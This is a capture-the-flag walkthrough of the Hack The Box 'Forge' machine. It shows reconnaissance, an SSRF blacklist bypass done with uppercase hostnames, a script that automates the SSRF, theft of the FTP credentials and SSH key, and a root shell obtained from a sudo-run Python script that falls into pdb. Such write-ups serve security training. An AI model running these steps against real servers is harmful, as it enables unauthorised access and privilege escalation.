# Forge

## Initial Foothold

First order of business, `nmap`

```
# Nmap 7.92 scan initiated Thu Sep 16 10:49:30 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up, received syn-ack (0.15s latency).
Scanned at 2021-09-16 10:49:37 +07 for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0=
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y=
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 16 10:49:46 2021 -- 1 IP address (1 host up) scanned in 15.91 seconds
```

We see that the web server on port 80 redirects us to `forge.htb` so we add that to our `/etc/hosts`. With a domain name, we fuzz for subdomains.

```sh
$ ffuf -u "http://forge.htb/" -H "Host: FUZZ.forge.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 18

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2, Duration: 547ms]
```

Looking at the web page `http://forge.htb/`, we can upload files, and after uploading, the server gives us the URL to the uploaded file. However, when I tried uploading a PHP reverse shell, I found that the file is renamed to a random name without an extension and going to the URL of the file doesn't trigger PHP code. Uploading via URL has the same issue as uploading local file. Trying to upload a file from my machine (run server with `python3 -m http.server`) to get the machine to make a request doesn't leak anything. I also tried getting local file inclusion by uploading `file:///etc/passwd` but protocols other than `http` and `https` are blocked. We know that we can upload files but can't run PHP code with it, so make note of the file upload and move on. Running `gobuster` doesn't return anything special.

```
/static               (Status: 200) [Size: 1306]
/upload               (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 274]
```

Navigating `admin.forge.htb`, we're given the message "Only localhost is allowed!". To bypass this, simple add the header `Host: http://localhost/` to each and every request to the page.

Going to `http://admin.forge.htb/` with the required header gives us 400 Bad Request no matter the URL so we `gobuster` returns nothing, even with the code 400 blacklisted. I then tried fuzzing for parameters but to no avail.

```sh
$ ffuf -u "http://admin.forge.htb/?FUZZ=test" -H "Host: http://localhost/" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt
$ ffuf -u "http://admin.forge.htb/?FUZZ=test" -H "Host: http://localhost/" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt -X POST
```

At this point, I was stuck so I went back to file uploading on `http://forge.htb`. Trying to upload from URL, uploading `http://forge.htb`, `http://admin.forge.htb` and `http://localhost` give the message "URL contains a blacklisted address!", which is interesting. In fact, it seems anything that's a subdomain of `forge.htb` is blacklisted, regardless of whether or not it exists. We can, however, bypass the blacklisting and upload if the case of the letters in the URL are changed, meaning we can upload "http://ADMIN.FORGE.HTB" and the like. After uploading, we can view the uploaded pages by making GET requests to the provided URLs using something like `curl` (the browser will try to render them as images and fail). I tried uploading several URLs, of which only `http://ADMIN.FORGE.HTB` gives us new information in the page.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

We see that we have the page `/announcements` which we can upload and leak.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

We have credentials for FTP! I tried to SSH in using the found credentials but couldn't because only login using public/private keys is allowed. The announcements also tell us how to make requests to a `/upload` endpoint. With some testing, I found that we can get the server to upload files by using "upload from url" with something like `http://ADMIN.FORGE.HTB/upload?u=http://YOUR_IP/test` (uppercase some or all characters in `admin.forge.htb` to bypass the blacklist) and get the uploaded content from the URL provided by the URL of the uploaded file. To put it simply: make the described request, grab the URL to that page, `curl` it, get another similar URL, and `curl` that to get the uploaded file. I put together a short script for testing this.

```python
#!/usr/bin/python3

import re
import requests

while True:
    url = input(">>> ")
    data = {"url": f"http://ADMIN.FORGE.HTB/upload?u={url}", "remote": "1"}
    r = requests.post("http://forge.htb/upload", data=data)
    try:
        url = re.findall("(http://forge.htb/uploads/.{20})", r.text)[0]
        r = requests.get(url)
        url = re.findall("(http://forge.htb/uploads/.{20})", r.text)[0]
        r = requests.get(url)
        print(r.text)
    except:
        print(r.text)
```

We're going through all those steps because this should make the server make requests to itself without going through firewalls, as well as using functions of an endpoint accessible only by the server internally. We were told in the announcements that FTP (and FTPS) should work in this secondary `/upload` endpoint and were given FTP credentials so let's use that. (I'm using my script but you can do it manually).

```
>>> ftp://user:heightofsecurity123!@LOCALHOST/
Something went wrong
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 17 08:52 user.txt

```

We can list and view files. Note that we're not uploading `localhost` since it's blacklisted, and just random case changes should also work. You can also use `127.127.127.127`, which is the loopback address, though `127.0.0.1` is blacklisted. We know we need an SSH key to SSH into the machine so we try grabbing it.

```
>>> ftp://user:heightofsecurity123!@LOCALHOST/.ssh/id_rsa
```

That should give us the SSH key to SSH in as "user".

## Privilege Escalation

Checking our privileges ...

```sh
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py

user@forge:~$ ls -l /opt/remote-manage.py
-rwxr-xr-x 1 root root 1447 May 31 12:09 /opt/remote-manage.py
```

We're able to run a python script as root without a password. We can't write to it though so we'll just execute it as root. Looking at the code ...

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

We see that after connecting to the server on a random port and giving the program a password, we can run a few system commands. The interesting part here though is that we have `pdb`, and `pdb.post_mortem(e.__traceback__)` is run if anything in the whole `try` block errors. We can also see that the user input `option` is converted to an `int` with `int()`. We can cause an error at this point by providing input that's not an `int`. To exploit, simply do the following:

1. Run the script with `sudo`
2. Get another SSH shell (the service seems to be unreachable from our attacking machine)
3. `nc` into the server and provide the password
4. For the prompt "What do you wanna do", enter something not an int like "a"
5. Go back the shell you can the server with. There should now be a pdb shell
6. In that shell, run `import os; os.system("/bin/sh")` to get a shell.

With that, we should have a shell as root.

